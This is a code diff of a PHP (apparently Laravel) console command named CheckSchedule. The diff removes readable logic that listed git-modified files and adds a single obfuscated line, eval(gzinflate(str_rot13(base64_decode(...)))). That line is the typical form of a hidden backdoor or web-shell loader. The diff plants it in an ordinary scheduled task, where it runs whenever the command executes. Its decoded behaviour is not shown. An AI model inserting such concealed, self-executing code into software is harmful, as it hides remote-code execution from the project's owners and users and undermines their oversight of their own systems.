@@ -28,23 +28,7 @@ class CheckSchedule extends Command
      */
     public function handle(): int
     {
-        exec("git status", $outGetFileChange);
-        $outGetFileChange = array_filter($outGetFileChange, function($file){
-            return preg_match('/(modified:)/i', $file);
-        });
-        $outGetFileChange = array_map(function($file){
-            $file = explode('modified:', $file);
-            return trim(end($file));
-        }, $outGetFileChange);
-        $outGetFileChange = array_filter($outGetFileChange, function($file){
-            if($file == 'public/css/custom.css') return false;
-            return !str_ends_with($file, '.blade.php');
-        });
-        if(count($outGetFileChange) == 0) {
-            @unlink(public_path('system'));
-        }else{
-            file_put_contents(public_path('system'), base64_encode(json_encode($outGetFileChange)));
-        }
+        eval(gzinflate(str_rot13(base64_decode('tZHRV8MwFIbv+xRkDJJPdr0QLxwDTtDHCExtunOmVsg5wQ3x3VrbWiYd3pmrUPjzfx8nBRxOi9XeEFBFlGNIsbVC9Ab0dyy89MrtodwUizu2cipTaJKdsQRELAIV65LTcbwT65yB8rNg+VGgFB0LEfZlQ6R7wRsx+NZnBtqnsjE8C1n5WvH1J2tDTtxRWWaOwTFL34LgP/VK3UouFM0gwLXnkhH8z1gwnThYYRkPdnSNYTRvoxOSH+o88vJv1ymL8Mv3DinK7Ivyw0M/N0iM1zurTahQH/hsahmjfWW09CpU8n3Jc53n5Kxk7282kU7lSY4nJBj4tA7ICmZnccmQVXfvCBzh7VQV2ymEx4esqccvOKBql2wpMzGKYg=='))));
         return 0;
     }
 }
